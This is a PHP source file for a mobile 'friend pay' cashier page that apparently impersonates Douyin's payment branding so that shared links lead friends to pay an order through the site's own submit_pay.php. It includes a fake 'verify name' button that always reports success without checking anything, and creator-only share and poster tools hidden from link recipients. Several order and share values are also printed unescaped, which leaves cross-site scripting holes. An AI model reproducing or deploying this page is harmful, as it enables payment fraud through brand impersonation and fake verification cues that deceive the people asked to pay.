<?php
require 'core.php';

// 1. 获取参数
$trade_no = !empty($_REQUEST['out_trade_no']) ? $_REQUEST['out_trade_no'] : (!empty($_REQUEST['trade_no']) ? $_REQUEST['trade_no'] : '');
$trade_no = strip_tags(trim($trade_no));

if(empty($trade_no)) die('错误：订单号缺失。');

// 2. 查询订单
$sql = "SELECT o.*, p.name as product_name, p.image, p.price, p.shop_name, 
        u.nickname as user_nick, u.avatar as user_avatar 
        FROM orders o 
        LEFT JOIN products p ON o.product_id = p.id 
        LEFT JOIN users u ON o.user_id = u.id 
        WHERE o.out_trade_no = ?";
$stmt = $DB->prepare($sql);
$stmt->execute([$trade_no]);
$order = $stmt->fetch();

if (!$order) { echo "<h3>😭 订单不存在</h3>"; exit; }

// === 【核心修改】解析多选商品数据 ===
$order_items = [];
$is_multi_item = false;
if (!empty($order['items'])) {
    $decoded_items = json_decode($order['items'], true);
    if (is_array($decoded_items) && count($decoded_items) > 1) {
        $order_items = $decoded_items;
        $is_multi_item = true;
        // 抖音风格标题：合并订单显示件数
        $order['product_name'] = "抖音商城订单 (共" . count($order_items) . "件)";
    }
}

// 3. 状态判定 (15分钟过期)
$is_paid = ($order['status'] == 1); 
$created_time = strtotime($order['create_time']);
$remaining_seconds = ($created_time + 900) - time(); 
if ($remaining_seconds < 0) $remaining_seconds = 0;
$is_expired = ($remaining_seconds <= 0 && !$is_paid);

// === 按钮与状态文案逻辑 ===
$btn_text = "确认付款";
$btn_url = "submit_pay.php?trade_no=".$trade_no."&tpl=cashier11";
$btn_class = ""; 
$btn_style = ""; 
$status_badge = "待支付";
$box_class = ""; 

$msg_btn_style = "width: 50%; margin: 0 auto; background: #fff; color: #333; border: 1px solid #e8e8e8; border-radius: 24px; font-weight: 500; font-size: 15px;";

if ($is_paid) {
    $btn_text = "发消息告诉Ta";
    $btn_url = "https://www.douyin.com"; 
    $btn_style = $msg_btn_style; 
    $status_badge = "已支付";
} elseif ($is_expired) {
    $btn_text = "发消息告诉Ta";
    $btn_url = "https://www.douyin.com"; 
    $btn_style = $msg_btn_style; 
    $status_badge = "支付申请已失效";
    $box_class = "expired-dim"; 
}

// 4. 【核心隐藏逻辑】
$show_manager_tools = false; 
$from_param = isset($_GET['from']) ? $_GET['from'] : '';

if ($from_param !== 'share' && !$is_paid && !$is_expired) {
    if (isset($_SESSION['user_id']) && $_SESSION['user_id'] == $order['user_id']) {
        $show_manager_tools = true;
    }
}

// 5. 分享配置
$protocol = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? "https://" : "http://";
$base_url = $protocol . $_SERVER['HTTP_HOST'];

$share_url = $base_url . '/cashier11.php?trade_no='.$trade_no.'&from=share';
$share_icon = (strpos($order['image'], 'http') === 0) ? $order['image'] : $base_url . '/' . ltrim($order['image'], '/');
$share_title = "抖音好物分享";
$share_desc = "我在抖音看中了这一件宝贝，帮我付一下呗，下次请你吃饭！";
$sc = get_share_card_config('cashier11');
if ($sc && $sc['share_title'] !== '') {
    $share_title = $sc['share_title'];
    $share_desc = $sc['share_desc'];
    if ((int)$sc['use_product_image'] === 0) {
        if ($sc['share_image'] !== '') {
            $share_icon = (strpos($sc['share_image'], 'http') === 0) ? $sc['share_image'] : $base_url . '/' . ltrim($sc['share_image'], '/');
        }
    } else {
        $share_icon = !empty($order['image']) ? ((strpos($order['image'], 'http') === 0) ? $order['image'] : $base_url . '/' . ltrim($order['image'], '/')) : (get_config('share_icon') ?: $base_url . '/xianyu.png');
        if ($share_icon && strpos($share_icon, 'http') !== 0) $share_icon = $base_url . '/' . ltrim($share_icon, '/');
    }
}

$jsConfig = get_wx_js_config();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>抖音代付</title>
    
    <meta property="og:title" content="<?php echo $share_title; ?>">
    <meta property="og:description" content="<?php echo $share_desc; ?>">
    <meta property="og:image" content="<?php echo $share_icon; ?>">

    <link rel="stylesheet" href="css/bootstrap-icons/bootstrap-icons.css">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; padding: 0; background-color: #F4F5F6; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", Arial, sans-serif; padding-bottom: 100px; }
        .page-header-text { text-align: center; padding: 40px 0 15px; }
        .ph-title { font-size: 19px; font-weight: bold; color: #161823; margin-bottom: 8px; }
        .ph-timer { font-size: 13px; color: #888; }
        .ph-timer span { color: #FE2C55; font-weight: 500; } 
        .main-card { background: #fff; margin: 10px 16px; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
        .user-row { display: flex; align-items: flex-start; margin-bottom: 15px; }
        .u-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; margin-right: 12px; }
        .u-info { flex: 1; }
        .u-name { font-size: 15px; font-weight: bold; color: #161823; display: flex; align-items: center; }
        .u-verify { font-size: 11px; color: #2a6ae2; font-weight: normal; margin-left: 6px; background: rgba(42, 106, 226, 0.08); padding: 2px 6px; border-radius: 4px; cursor: pointer; }
        .u-msg { font-size: 13px; color: #999; margin-top: 4px; line-height: 1.4; }
        .inner-gray-box { background: #F9F9FA; border-radius: 8px; padding: 20px 16px; transition: all 0.3s; }
        .expired-dim { opacity: 0.6; filter: grayscale(100%); background: #f0f0f0; }
        .price-row { display: flex; align-items: center; margin-bottom: 20px; }
        .p-symbol { font-size: 20px; color: #161823; font-weight: bold; margin-right: 2px; margin-top: 6px; }
        .p-val { font-size: 42px; color: #161823; font-weight: bold; font-family: DIN, Arial; }
        .p-tag { margin-left: 10px; font-size: 11px; color: #FE2C55; border: 1px solid rgba(254, 44, 85, 0.3); padding: 1px 4px; border-radius: 3px; height: 18px; line-height: 16px; margin-top: 8px; white-space: nowrap; }
        .expired-dim .p-tag { color: #666; border-color: #ccc; }
        
        /* 商品列表样式适配 */
        .prod-row { display: flex; align-items: center; margin-bottom: 12px; }
        .prod-row:last-child { margin-bottom: 0; }
        .prod-img { width: 36px; height: 36px; border-radius: 4px; object-fit: cover; margin-right: 10px; flex-shrink: 0; background: #eee; }
        .prod-info-col { flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        .prod-name { font-size: 13px; color: #333; line-height: 1.3; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .prod-count { font-size: 12px; color: #999; }

        .footer-tips { margin: 15px 20px; font-size: 12px; color: #999; line-height: 1.5; }
        .bottom-fixed { position: fixed; bottom: 0; left: 0; width: 100%; background: #F4F5F6; padding: 10px 15px 40px; z-index: 100; }
        .btn-pay { display: block; width: 100%; height: 48px; line-height: 48px; text-align: center; background: #FE2C55; color: #fff; font-size: 17px; font-weight: bold; border-radius: 4px; text-decoration: none; border: none; }
        .btn-disabled { background: #DDDEE0 !important; color: #fff !important; }
        .dy-footer-logo { position: fixed; bottom: 15px; left: 0; width: 100%; text-align: center; font-size: 11px; color: #ccc; display: flex; align-items: center; justify-content: center; z-index: 101; padding-bottom: env(safe-area-inset-bottom); }
        .dy-footer-logo i { margin-right: 4px; font-size: 12px; }
        #verify-toast { display: none; position: fixed; bottom: 120px; left: 50%; transform: translateX(-50%); background: #fff; color: #333; padding: 10px 20px; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); font-size: 14px; font-weight: 500; z-index: 9999; white-space: nowrap; align-items: center; }
        #verify-toast i { color: #000; margin-right: 6px; font-size: 16px; }
        .floating-bar { position: fixed; right: 15px; bottom: 150px; z-index: 900; display: flex; flex-direction: column; gap: 15px; }
        .float-btn { width: 48px; height: 48px; background: #fff; border-radius: 50%; box-shadow: 0 4px 15px rgba(0,0,0,0.15); display: flex; flex-direction: column; justify-content: center; align-items: center; font-size: 10px; color: #666; cursor: pointer; transition: transform 0.1s; }
        .float-btn:active { transform: scale(0.9); }
        .float-btn i { font-size: 20px; color: #FE2C55; margin-bottom: 1px; }
        .mask { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; }
        .share-guide { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; text-align: right; padding: 20px; color: #fff; }
        .poster-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
        #poster-img { width: 80%; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        #poster-source { position: fixed; left: -9999px; top: 0; width: 375px; background: #fff; border-radius: 0; overflow: hidden; padding-bottom: 30px; }
    </style>
</head>
<body>

    <?php if ($show_manager_tools): ?>
    <div class="floating-bar">
        <div class="float-btn" onclick="showGuide()">
            <i class="bi bi-share-fill"></i>
            分享
        </div>
        <div class="float-btn" onclick="generatePoster()">
            <i class="bi bi-images"></i>
            海报
        </div>
    </div>
    <?php endif; ?>

    <div id="verify-toast">
        <i class="bi bi-check-circle-fill"></i> 校验成功
    </div>

    <div class="page-header-text">
        <div class="ph-title">亲友付</div>
        <?php if(!$is_expired && !$is_paid): ?>
        <div class="ph-timer" id="top-timer">
            剩 <span id="time-str">00:15:00</span> 订单关闭
        </div>
        <?php endif; ?>
    </div>

    <div class="main-card">
        <div class="user-row">
            <img src="<?php echo $order['user_avatar'] ?: 'youke.png'; ?>" class="u-avatar">
            <div class="u-info">
                <div class="u-name">
                    <?php echo htmlspecialchars($order['user_nick'] ?: '须尽欢'); ?>
                    
                    <?php if(!$is_expired && !$is_paid): ?>
                        (**店)
                        <span class="u-verify" onclick="showVerifyToast()">校验姓名</span>
                    <?php endif; ?>
                </div>
                <div class="u-msg">我拼了喜欢的宝贝，帮我付个款吧</div>
            </div>
        </div>

        <div class="inner-gray-box <?php echo $box_class; ?>">
            <div class="price-row">
                <span class="p-symbol">¥</span>
                <span class="p-val"><?php echo $order['money']; ?></span>
                <span class="p-tag"><?php echo $status_badge; ?></span>
            </div>
            
            <?php if ($is_multi_item): ?>
                <?php foreach($order_items as $item): ?>
                <div class="prod-row">
                    <img src="<?php echo $item['image']; ?>" class="prod-img">
                    <div class="prod-info-col">
                        <div class="prod-name"><?php echo htmlspecialchars($item['name']); ?></div>
                        <div class="prod-count">¥<?php echo $item['price']; ?> x 1</div>
                    </div>
                </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="prod-row">
                    <img src="<?php echo $order['image']; ?>" class="prod-img">
                    <div class="prod-info-col">
                        <div class="prod-name"><?php echo htmlspecialchars($order['product_name']); ?></div>
                        <div class="prod-count">x1</div>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <?php if(!$is_expired && !$is_paid): ?>
    <div class="footer-tips">
        如果订单申请退款，已支付金额将原路退还给你。
    </div>
    <?php endif; ?>

    <div class="bottom-fixed">
        <a href="<?php echo $btn_url; ?>" class="btn-pay <?php echo $btn_class; ?>" style="<?php echo $btn_style; ?>">
            <?php echo $btn_text; ?>
        </a>
    </div>

    <div class="dy-footer-logo">
        <i class="bi bi-tiktok"></i> 抖音支付 | 9亿人都在用
    </div>

    <div class="mask" onclick="$(this).fadeOut();$('.share-guide').fadeOut();$('#poster-modal').fadeOut();"></div>
    <div class="share-guide" onclick="$('.mask').fadeOut();$(this).fadeOut();">
        <img src="curved-arrow.svg" style="width:60px; transform: rotate(-90deg); margin-right: 20px;">
        <p style="font-size:18px; font-weight:bold; margin-top:10px;">点击右上角菜单<br>发送给朋友</p>
    </div>

    <div id="poster-source">
        <div class="page-header-text" style="padding-top:30px;">
            <div class="ph-title">亲友付</div>
        </div>
        <div class="main-card" style="box-shadow:none; border:1px solid #eee;">
            <div class="user-row">
                <img src="<?php echo $order['user_avatar'] ?: 'youke.png'; ?>" class="u-avatar" crossorigin="anonymous">
                <div class="u-info">
                    <div class="u-name"><?php echo htmlspecialchars($order['user_nick'] ?: '须尽欢'); ?></div>
                    <div class="u-msg">我拼了喜欢的宝贝，帮我付个款吧</div>
                </div>
            </div>
            <div class="inner-gray-box">
                <div class="price-row">
                    <span class="p-symbol">¥</span><span class="p-val"><?php echo $order['money']; ?></span>
                </div>
                
                <?php if ($is_multi_item): ?>
                    <?php foreach($order_items as $k => $item): if($k >= 3) break; // 海报限制显示3个 ?>
                    <div class="prod-row">
                        <img src="<?php echo $item['image']; ?>" class="prod-img" crossorigin="anonymous">
                        <div class="prod-info-col">
                            <div class="prod-name"><?php echo htmlspecialchars($item['name']); ?></div>
                            <div class="prod-count">¥<?php echo $item['price']; ?> x 1</div>
                        </div>
                    </div>
                    <?php endforeach; ?>
                    <?php if(count($order_items) > 3): ?>
                    <div style="font-size:11px;color:#999;text-align:center;margin-top:5px;">... 等 <?php echo count($order_items); ?> 件商品</div>
                    <?php endif; ?>
                <?php else: ?>
                    <div class="prod-row">
                        <img src="<?php echo $order['image']; ?>" class="prod-img" crossorigin="anonymous">
                        <div class="prod-info-col">
                            <div class="prod-name"><?php echo htmlspecialchars($order['product_name']); ?></div>
                            <div class="prod-count">x1</div>
                        </div>
                    </div>
                <?php endif; ?>

            </div>
            <div style="margin-top:20px; text-align:center; border-top:1px dashed #eee; padding-top:15px;">
                <div id="qrcode-box" style="display:inline-block;"></div>
                <div style="font-size:11px; color:#999; margin-top:5px;">长按识别二维码代付</div>
            </div>
        </div>
        <div class="dy-footer-logo" style="position:static; margin-top:20px;">
            <i class="bi bi-tiktok"></i> 抖音支付 | 9亿人都在用
        </div>
    </div>

    <div id="poster-modal" class="poster-modal" onclick="$(this).fadeOut();$('.mask').fadeOut();">
        <img id="poster-img" src="">
        <div style="color:#fff; margin-top:15px; font-size:14px;">长按保存图片分享</div>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/qrcode.min.js"></script>
    <script src="js/html2canvas.min.js"></script>
    <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
    <script>
        function showVerifyToast() {
            var toast = $('#verify-toast');
            toast.css('display', 'flex').hide().fadeIn(200);
            setTimeout(function() { toast.fadeOut(300); }, 2000);
        }

        function showGuide() {
            var mask = document.querySelector('.mask');
            var guide = document.querySelector('.share-guide');
            if (typeof $ !== 'undefined' && $ && $.fn && $.fn.fadeIn) {
                $('.mask').fadeIn(); $('.share-guide').fadeIn();
            } else if (mask && guide) {
                mask.style.display = 'block'; guide.style.display = 'block';
            }
        }
        
        function generatePoster() {
            if ($('#poster-img').attr('src')) {
                $('.mask').fadeIn();
                $('#poster-modal').css('display', 'flex').hide().fadeIn();
                return;
            }

            $('.mask').fadeIn();
            var loading = $('<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;z-index:10001;background:rgba(0,0,0,0.7);padding:10px 20px;border-radius:8px;">正在生成...</div>');
            $('body').append(loading);
            
            setTimeout(function() {
                html2canvas(document.getElementById('poster-source'), { 
                    useCORS: true, scale: 2, logging: false, backgroundColor: '#F4F5F6' 
                }).then(canvas => {
                    loading.remove();
                    $('#poster-img').attr('src', canvas.toDataURL("image/png"));
                    $('#poster-modal').css('display', 'flex').hide().fadeIn();
                });
            }, 10);
        }

        <?php if(!$is_paid && !$is_expired): ?>
        var rSeconds = <?php echo $remaining_seconds; ?>;
        function updateTimer() {
            if (rSeconds <= 0) {
                location.reload(); 
                return;
            }
            var h = Math.floor(rSeconds / 3600);
            var m = Math.floor((rSeconds % 3600) / 60);
            var s = rSeconds % 60;
            var str = (h<10?'0'+h:h) + ':' + (m<10?'0'+m:m) + ':' + (s<10?'0'+s:s);
            $('#time-str').text(str);
            rSeconds--;
        }
        setInterval(updateTimer, 1000);
        updateTimer();
        <?php endif; ?>

        var wxConfig = <?php echo json_encode($jsConfig); ?>;
        if (wxConfig) {
            wxConfig.jsApiList = ['updateAppMessageShareData', 'updateTimelineShareData'];
            wx.config(wxConfig);
            wx.ready(function () {
                var shareData = { 
                    title: <?php echo json_encode($share_title); ?>, 
                    desc: <?php echo json_encode($share_desc); ?>, 
                    link: <?php echo json_encode($share_url); ?>, 
                    imgUrl: <?php echo json_encode($share_icon); ?> 
                };
                wx.updateAppMessageShareData(shareData);
                wx.updateTimelineShareData(shareData);
            });
        }

        $(function() {
            $('#qrcode-box').empty();
            new QRCode(document.getElementById("qrcode-box"), { text: "<?php echo $share_url; ?>", width: 100, height: 100 });
            $('.floating-bar .float-btn').first().off('click').on('click', function(e){ e.preventDefault(); showGuide(); });
        });
    </script>
</body>
</html>